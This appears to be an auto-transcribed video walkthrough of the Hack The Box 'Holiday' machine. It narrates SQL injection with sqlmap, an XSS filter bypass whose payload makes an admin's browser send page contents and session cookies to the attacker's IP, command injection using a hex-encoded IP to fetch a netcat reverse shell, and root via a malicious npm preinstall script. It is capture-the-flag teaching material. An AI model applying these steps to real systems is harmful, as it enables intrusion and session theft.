 what's going on YouTube this is IPSec and we're gonna be doing the Holiday machine from hack the box this machine was tough it starts off the sequel injection then once you do that it goes into cross-site scripting which you have to bypass two filters and then once you do that there is a weird command injection where you're limited on what characters you can put in and then after that it is a professed through node or NPM the node package management so I may go through this bit fast I'm at sans hackfest from last Monday to this Monday and we're doing the beta testing on roster labs so I am very strapped for time this video didn't have any time prepare for it so I guess well pretty much been doing this live let's jump in most earth to box off at the end map so hand map - SC safe script sv animate version Oh a I'll put all formats we'll call that and map and the IP address of holiday which is 1010 1025 looking at those results we do see port 22 and 8,000 is open 8,000 is listening on HTTP so let's see what is there did not type 8,000 it is just a page with big octagon looking at the source we do see JavaScript a CSS directory image with hex PNG may be worth looking at steganography here but the first thing let's just check the obvious check like robots.txt doesn't exist and this is a semi unique 404 page and that is because it's running just straight node JavaScript framework and not going through nginx or Apache but not too important we can check like slash admin that's a common page and we get to login so we could try a few requests right here but should set some type of enumeration going in the background because always have background numeration why you do active things because you don't have to really do anything with this it just runs and when you hit a brick wall it's always nice to go back and look at if any your tools found anything else so we'll run do a blast or go by as I like and would give it to URL which is 10 10 10 25 and a word list this can be a word list I created because I don't want to wait for a long time I would recommend using the one and like user share doorbuster small I'll show that right after we do this but first we have specify port 8000 doorbuster returns no results and looking at this word list we know at least one pulse on the back we have slash login and slash admin here so let's go back into Firefox will turn intercept on so it goes to burp refresh this page and we have turn intercept on refresh go to send this to repeater and we get results so if we play with this user agent just see if it's doing some type of filtering and have nothing there or just don't have Windows Linux we get a 404 page so it's doing some type of routing based upon user agent and this is common when like read web pages route to mobile clients things like that to serve up a mobile page but we know we need to have Linux in this user agent if we want to do a door buster against the website so we can specify - a for user agent and we'll just put Linux and we can cedar buster now works and I keep saying door buster let's go buster but yeah the word list I mentioned before if you haven't watched other videos user share word list door buster and probably one of these directory list ones are good there's a my normal gurus but next step would be to send this to sequel map so we have the request in book we're going to copy to file I'm going to call this login request save it Kathir file make sure we copied everything because if you have anything highlighted anything at all and copy to a file well name this garbage it'll only copy what's highlighted and that can cause headaches so we do sequel map and then want to do - help real quick yeah high risk risks max is three and levels max is 5 ok these level and risk it's just how risky or deep these queries go since this is a test site and not production we want to have sequel map throw everything at it so we'll use those flags so sequel map - are specify request file login dot request - - level 5 - - risk 3 and we do threads 20 to try to speed it up 10 so we'll do 10 threads request critical page not found so when I copied this request I copied one with Windows so welcome dot request change windows to be linux and this box would suck if your pen test machine was Windows and you weren't using Linux so we run through this let this run and it should find something there we go found or boolean based blind injection and now it's trying to numerate what type of database it's going to be sequel light let this finish running don't want sequel map and we won't go into exactly how this injection works just because strapped for time and there's plenty of other sequel injection boxes and I'll save that peace for another video we're just going to use and mapped enumerate every thing so I'm going to do - - - and we're just going to dump all the tables on the database we could do - trash dump or - trash dump all and just dump everything but again this is going to be faster so we know there's a users table so we can just do - cap roti users and then - - top and this is going to take a little while so we'll control see out of that threads 10 and you can see how quick this is and oh it's trying to crack it wait sure but the key thing is we have a user named Rick a and the password which is this md5 sum so we can just grab that time intercept off temporarily paste this and we get a website that has said we know what this hash is so going here shows Rick a is never gonna give you up so Holliday just rickrolled us kind of login with his credentials go back to the webpage 1010 1025 : 8000 slash login his name was Rick a with a capital R and a passwords never gonna give you up and we go into the booking management portal looks like we just have a agents credentials because we don't have any administrative functions but I would start aider Buster in the background just to see if there's any other hidden pages we could try like slash admin to see if we have access there directs us back to a slash agent so now can do it because of time instead we'll just click on a random entry and we see the booking details emails here name nothing interesting if we go over to notes though we do see all notes must be approved by an administrator this process may take up to one minute so it's safe to assume there is some script going on the background that goes to a page and prove something and if they're going to a page let's try some JavaScript so JavaScript would be like cross-site scripting so script Java Script alert 0 so if someone used this page what's going to happen you can take up to a minute for this to come up but it's going to show up and it's going to be filtered and I believe the reason is the creator of the CTF didn't want the page people view to be cross-site script ball because if we had like 50 people hitting this page then they'd all get cross-site scripting and bad things could happen so instead there's probably a separate portal with the administrator clicking approve and that's the one that has cross-site scripting on it you may think it's silly but if we go over and Google like GoDaddy XSS blind we should get a posting from threat post the hacker blog from Matthew Bryan aka mandatory and what he did is he put JavaScript and the GoDaddy's username field and was just testing it to see if any GoDaddy page was injectable it wasn't until he ended up calling GoDaddy for unrelated issue and the tool he used was XSS HANA and it generated a report soon as the helpdesk agent got on the phone and what happened was the GoDaddy portal wasn't vulnerable to cross-site scripting however that same information was used in a different website where the helpdesk was and that didn't filter the JavaScript and ended up doing the cross-site scripting so if you thought that was like a silly CTF thing just want to tell you does happen in the real world so this is a pretty cool challenge from that standpoint refreshing the page and we do see it is completely filtered so at this point I'd go to like a wasp XSS evasion and there is a cheat sheet that has a bunch of different things you can try for the sake of time I'm just going to do the one I know works so image source equals quote is it x / y /x x / y a like this then we can do script JavaScript dot alert 0 / script and the reason this works is because we're putting JavaScript in the image tag the regular expression that's checking this is just assuming this entire thing is a URL and not doing the filter or I believe that's exactly what's going on copy this add it and it's still not going to work we have to do one last thing and that is to encode this and ordinal values or numeric values so if we do all mine JavaScript I don't want that is a page here we go so if we do JavaScript code I am do string from care code is equal to or do 65 66 67 and then execute that we see the results ABC so if we can get this which is much safer than doing like document dot write and other things we can probably bypass the filter so let's see go back to booking management I want to put this back clipboard and we do see this went through there's something that is filtering I can't remember off the top my head but if we look at the page we can see the difference here is it's not putting the ampersand and the HTML forget what it's card maybe entity encoding because right here this is where we saw it being ugly and this where the thing printing cleanly if we just go here the reason it does this is because it's saying hey that is and less then and this ampersand is also HTML and D encoded so a browser didn't encode that character to be this but because this less than is encoded the JavaScript doesn't work on that page so the next thing we have to do is get the portion between here and code it because I'm pretty sure maybe it's document dot write or other things that it filters on I know there's another filter here that we had to bypass I just don't know the dirty words off top my head so we'll do string dot o first we'll do eval string dot from care code then we can close that out and then we have to close one more and what we'd want to do is like a let's see document dot write script oh this is why why because we do other scripts and this that's probably a script source equals HTTP 10 10 14 I think I'm 8 yes 10 10 14 8 because if we look at this we can't just send this cookie into a netcat because we have HTTP only is enabled so it's going to stop the easy cookie grabber javascript you may have seen and other examples or websites but scriptures close out my IP no no we have to do a filename holiday dot j/s that's fine for now script source that close the bracket and / script okay single quote close that parenthesis that should be so that document right is going all that way see if this works and we'll see what gets filtered I believe this script will but we can begin doing the from care code thing we could just find a website to automatically convert all this but it's simple enough to do it and Python and that's just how I prefer doing it whenever there's a simple task I try to do it myself because you're gonna have to learn how to code one day and doing the simple things it just builds up that muscle memory and learning how to code is great and the also benefit is you do it from a site and you have to do a small tweak because it's not in the exact format you want you're screwed if you have the code you can just do it yourself so first thing I don't need to show you is there is a way to go from character the ordinal and that is just would a and we can see that prints 65 and I just did I Python it's like interactive Python so we need to create a loop to take a string because we can't do or day be it errors out so we need to go one character at a time so when I create a function by doing def and we're gonna name it create encoded j/s so when a passage of string and we'll call that string ASCII the first thing here I'm going to do is just create decimal string and that's going to be the encoded values and I do this just because I want to assign this to be a string value and bicep doing this double quote here that's just I guess I get a way to do that I don't want this variable to ever take any other form so do that and we do for care BB for character in this string ASCII we're going to do will just print it out real quick to show you print care yeah double care but go back and if we do create and co2 Jas and now pass it like ABC see what it does integer is required so it wants this value to be an integer oh crap hey I wanted wood that's why it aired out I was confused for a second but ordinal care that's what I want hard to talk and tight and then whoa get back to where we were nope so print create and go to J s ABC and there we go so what we want to do is have this all to be on one line so we do that by just decimal string plus equals and that's going to append and then we wait to return decimal string so now a function will return that Oh so what it's saying here is we have an error message it can't add this ordinal to this string because it's a mismatch of variables so we can do string around that and tell it nope I don't care if that's just a number behave like a string and then print encode it ABC for care and ASCII I return to earlier if we backspace this four times there we go now ABC works but as you saw earlier we do need to have commas between those numbers so we can just do plus comma and then we're gonna have one small issue of there being a trailing comma so we can just put a colon negative one at the end of that string and brackets to say hey strip off the last character and now when we run that we get exactly what we want so going back to this document dot write string from care so we can go to Jas want to paste all of this so I'm going to do three quotes so it doesn't escape I don't have to escape anything actually I'll show what happens if I don't do that first so two single quotes and we look at this line and it's kind of miss colored because we have this one quote and it's going till this other double quote and that's the end of the string to its knowledge then this piece is behaving like it's not within these quotes so what we do triple-core at the beginning triple-core at the end and then we don't have to worry about escaping anything and we have a variable whoops we can copy this paste it here and we can just step in that cat listener LVN p80 and we're gonna hope this works cuz if it doesn't I will be really sad so it's gonna take about a minute for this to come through and we should see the hit on this net cat and the reason we're doing this first is just to make sure hey we have code execution on their browser because they're hitting us it's just like a blind way to do it or maybe it's not blind just a back-channel way to do it here still have three the westmore's at 4 a.m. refresh it came for six and a browser did not show it so we have a mistake somewhere so document dot write single quote script space SRC HTTP tand that is our IP correct I have config 10 4 4 14 8 yes yes close that off /script close the document right that looks good let's look at this I mean sure there's no space here nope then script eval string from care coud ok what if I need semicolon here and I'm missing a parenthesis that's where it was so we have to open parenthesis and we only had one so try this again and wait so hopefully this time it works because I don't want to do a lot of debugging see image source script FL care that should work and we do we get a hit back so the web browser has access to a server and did a request for holiday s so what we have to do and we also see they're hitting it from localhost they're not going to the IP so that's how that's coded the easy part now or that I say easy just the non mind breaking of doing all this encoding because this is doing three different encodes where web browsers getting this it's converting this into from numbers to characters that's doing an eval to execute what it just undid and then it's got that evasion so that was a pain but the next part isn't too bad if you kind of know what you're doing so we're gonna create that holiday Jas we don't have to do any more evasion because it's putting a link to a file on our computer and then just executing it so don't talk about any more of that we just do some type of request to get the data out of that cookie that's HTTP only so we're gonna create two JavaScript requests rec one new XML HTTP request and we're gonna do another one so one request is going to go to the page and pull the page and the second request is going to send the page to us so that's why I have two here so requests one dot open get then the URL that's not what I wanted that is holiday so we want this URL copy paste that okay the main thing to do is make sure every line ends in that semicolon request one dot send okay response equal to or quest one spots text so we're doing here is having their web browser send a request to the page and then save the response in a variable and we can do rams and now we're gonna start building or requests or the request from it back to us so equals cookie plus encode your I component sponsz that looks fine request to dot open we want to send a post request back to us correct sponsz spelling is also an issue request to dot set header content tight application xw just creating the HTTP header here and then request to dots and params think that should be fine we can move this down here just so it makes a bit more logical sense so create a new XML request having the web browser do a get request to itself and then save that response into a variable could a new request put the response variable and the cookie parameter and send it back to us I think that should work so wait I'm missing something I need a second year old on I first oh no I say that twice maybe I was saying something as I was talking but now that definitely is it twice that is HTTP 10 10 14 8 and we'll say port 8000 slash that should be fine so post URL boolean now that should work that looks better place on em simple HTTP server port 80 and we can set that cat on 8,000 so now when we send the same request it's actually going to download that holiday Jas here which is going to make it hit itself and then send us the response so we'll see if that works there we go checked should be executing I guess we had an error because it's not sending us anything so let's check our code nothing ever works right the first time requests one new XML HTTP request okay get a page that's fine that's fine response dot response text that's fine it's fine params equals forgot equals here cookie + good so now we'll try as you see everything is trial and error so 414 is the less on this hit 49 so hopefully this one works I want to direct this to a file but I don't want to miss so if it responds it's going to send the contents to a file check here to make sure so 414 is the last time still has not hit so as soon as this hits we'll see if we did it correctly for 16 and we get a connection so finally we have that cookie if we kept the file no we don't it didn't put it and did an options request that should be a post request see holiday quest to open toast gamma HTTP 10 10 14 8 8,000 it's that true okay did I misspell this in code you I see OMP Ont no I did not I'm not sure what happened here quest to set quest header content type application was to params I have no idea why did that options request we obviously read this life it knew how to get back to me try it again definitely want to save that in case I over right in my clip would what sent connection so let's try this again still nothing oh I see what it is oops scroll down URL encoded stupid mistake things are really sensitive so now when I send that to a file this will work it's going on port 80 it's gonna hit this notes still have it do not have my clipboard that is why I was smart and put it here so copy paste oh sorry about that guys that was frustrating but hopefully it's a learning experience that even the smallest of typos can cause major issues forgot a simple D there we go and got the request if we can't temp we have a bunch of data now so we're going to do is open a new tab cat temp and this is all URL encoded so what we have to do is unencoded the and then we can view the contents and it's a lot easier than you'd think so copy just minimize that go back and paesan we can import URL Lib and then print URL web dot unquote do the triple quotes paste all that data triple quotes and I didn't undo the parentheses so go to the other one and we get the URL or the content of that HTML page the important thing is down at the very bottom we see a hidden function admin approve and we have a cookie connect SID and then some data so if we copy this cookie and then copy yet because I want to see what mine looks like tools cookie manager edit connect Sid that's percent copy this place fresh and now I have the admin page and here's the notes page if I do something we'll see if it's immediately cross-site scripting so okay this paste go back to this and we'll see if it immediately gets approved gets hit notes so we hit it I don't know where we hit it but we hit it so there was course a scripting somewhere oh we get redirected immediately so if I paste this intercept request Roxie want that one go back here paste we see our post get this page I'm just redirecting immediately because I think it should go to a prove page where we can see that cross-site scripting but needless to say we are now an admin oh here's that approved page but we're now admin so what we can do is figure out a slash admin we have two features right here an export feature so if we export notes we can save this to file and cat download slash notes would it save as export notes we see we have some type of way to export data if we try to do any fuzzing on this so if we go back to book turn intercept on click on notes repeater okay we got the page let's try semicolon LS to try a compassionate command injection we get invalid table name the only characters are a range of A to Z 0 to 9 and space and slash so we have ants so if we do and OS what happens we get new output from and LS but if we did like a we have to incur this well because an is a URL thing to separate variables but still don't see anything we do sleep plus 10 try like a blind injection method another page is gonna take just about 10 seconds so we know we have code execution one other thing you can do and we'll do it once this page comes back there we go 10 point zero to eight milliseconds is if we did a slash here and escaped the sequel white syntax we could get syntax back but that isn't needed for what we're going to be doing we have to get command injection with only those few characters or a reverse shell and it may be difficult because if we go to the reverse shell chichi almost everything is gonna use semicolons or periods so we can even use we can do space slash at sea to get something but if we tried to cat Etsy add user Kampf even if we don't have permission for this it won't matter because dot is not allowed that is a very common character in almost every command and like I said IPAs host names etc all have that dot at home however there are different ways to encode and IP so if you do like same except on encode IP hex if we convert our IP and the hex 0 X at 0 0 1 the computer actually resolves it you can encode the IP and other formats the one 27001 is just the most common format to encode the IP so what that means is we can actually do like a double you get request to download a file so we want to encode 1010 14.8 Bing copy that wrong I had an H to the end there we go 10 10 14 8 it's my IP so what we can do go back to put repeater notes W get 10 10 14 8 and hex format Plus will do port 80 oh we don't have to we can just do slash shell dot PHP can't do a slash slash shell we can't do it dot so we can only name it /l but that's fine so if we do V shell and we'll try and test monkey shell cheat sheet this one may work and it's super simple but this is by far the most reliable one then SH netcat 10 10 14 8 and we'll do this on port 1 3 3 7 ok then - should be fine Python em simple HTTP server on port 80 is already in use it's over here that's fine go back to put W get shell and valid character where is that notes that's an ampersand double you get plus a 2 Z 0x not case-sensitive so lower case a lower case a lowercase e w get Python looks like it handled that just fine so if we go to Boop again oh we have to open up a shell that cat LVN p80 clear this first and cat lv MP 1337 I don't know why it generated necessay key I don't have - SSL that was weird I'm just gonna do and cat there we go so we have that W get down name this download that so wall again this will be execute do table let's W get bashed space cell and we get a shell so the next thing to do Python C and port PT y PT y dot spawn slash bin bash Python not found Python 3 - see em put PT y PT y dot spawn slash bin - there we go background with control Z as to why raw - echo foreground and we have a shell so the first thing to do is I guess sudo - L and we see that we may access NPM oh I'm going to sidetrack a little bit the whole reason that I knew about this encoding IP thing was actually a funny story if you google what is it I CTF the 2016 DDoS there we go you google that this is a good article that explains it so essentially long story short there was a CTF competition and probably the team that could have won it had created a botnet and infected everyone at that CTF and what they were doing is stealing flags and all that sort of thing the Chi tree but what they also did with the very last second tried to denial-of-service the winning team so they couldn't submit flags and then this team could submit flags and take first place but in doing so they do not service the entire CTF competition brought it down so they couldn't submit their flags to take first place and ended up losing but to top it off once they lost they had the balls to complain to the CTF organizers saying hey your scoring system went down we couldn't submit flags that's bullcrap we should have first place which causes an investigation the investigation found this botnet that they use and one of the things they did was encode IP addresses I think it was see if we can find it but yeah I would highly recommend reading this article decoding yeah they're using it in Wornall format like this IP address two eight eight seven seven four like that's not an IP address but if we try to ping it just straight numbers goes to 170 231 129 two or three so highly recommend that blog post but we can go back to the professor so we see NPM has the pseudo mission to do whatever I space star is and that is install so if we do NPM I and then something we see it is trying to install and this is a very dangerous thing to do it was prevalent on Macs quite a while ago when homebrew had configured it in this way that gave NPM the sudo permission to install and if we google around we should be able to find an article so NPM install dangerous very first blog post that comes up with that is this one and he kind of says exactly what the issue is but we'll just be doing it pretty quickly so if we copy these files and I know it's probably better to get clone and copy them but these boxes don't have internet so yeah rim rut fall them fall see that V this was index not J yes I don't think this file was needed but might as well it doesn't take long to copy it and the next file package.json copy this okay name description' pre-install this is the thing with all the issues have come from this pre-installed flag allows us to execute shell commands so we execute let's see if we do that you can save that the slash temp will copy copy shell to slash temp shell C slash temp V shell and will change temp F to tap be change this port to one city 38 and we'll see if we can execute this script that looks fine if this free install is now going to be bash tap shell okay open new window and CL v MP 133 8 now we can cat we're gonna fly yes gonna run the shell and PM I to install it remember fall don't forget the sudo and see if that works doesn't look like an execute in will try - - unsafe see if that does anything and we get a show back ID and we a root so CD root and we could view the flag so that is how you do note or not node holiday holidays machine we're doing so you can tell it's been a long week so yep hope you guys enjoyed and I guess I'll see you next week for whatever boxes retire next take care guys